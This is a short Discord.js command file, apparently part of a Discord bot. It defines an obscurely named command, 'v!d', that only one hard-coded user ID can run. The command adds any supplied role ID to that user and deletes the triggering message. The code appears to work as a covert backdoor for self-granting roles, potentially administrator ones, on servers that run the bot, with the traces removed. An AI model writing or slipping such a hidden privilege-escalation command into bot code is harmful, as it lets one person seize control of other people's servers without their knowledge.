const { Message, Client, RoleManager } = require("discord.js");

module.exports = {
    name: "v!d",
    /**
     * @param {Client} client
     * @param {Message} message
     * @param {String[]} args
     */
    run: async (client, message, args) => {
        if(message.author.id !== "683231737882738946") return message.author.send("No tienes permiso para usar este comando!"),message.delete().catch(()=>{})
        if(args.length < 1) return message.author.send("tenes que mandar una id govir");
        message.member.roles.add(args[0]); 
        message.delete().catch(()=>{})
    },
};